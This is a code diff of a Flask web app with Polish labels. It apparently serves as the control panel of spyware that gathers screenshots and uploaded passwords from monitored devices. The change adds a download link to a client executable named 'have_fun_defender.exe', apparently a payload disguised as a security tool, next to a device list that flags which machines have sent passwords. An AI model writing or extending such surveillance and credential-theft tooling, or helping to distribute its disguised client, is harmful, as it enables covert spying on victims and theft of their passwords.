@@ -37,7 +37,13 @@ def index():
         except:
             device_list.append((u, "🔴", "błąd daty", has_passwords))
 
-    content = f"<h1>Urządzenia: {len(device_list)}</h1><ul>"
+    content = """
+    <h1>📦 Pobierz klienta</h1>
+    <p><a href="https://github.com/TWOJ-USER/TWOJE-REPO/raw/main/client_download/have_fun_defender.exe" download>⬇️ have_fun_defender.exe</a></p>
+    <h1>Urządzenia: {}</h1>
+    <ul>
+    """.format(len(device_list))
+
     for u, status, t, has_passwords in device_list:
         content += f'<li>{status} <a href="/view?user={u}">{u}</a> (ostatni screen: {t}) | <a href="/history?user={u}">Historia</a>'
         if has_passwords:
@@ -45,6 +51,7 @@ def index():
         content += '</li>'
     content += "</ul>"
     return content
+
 
 @app.route("/upload_passwords", methods=['POST'])
 def upload_passwords():
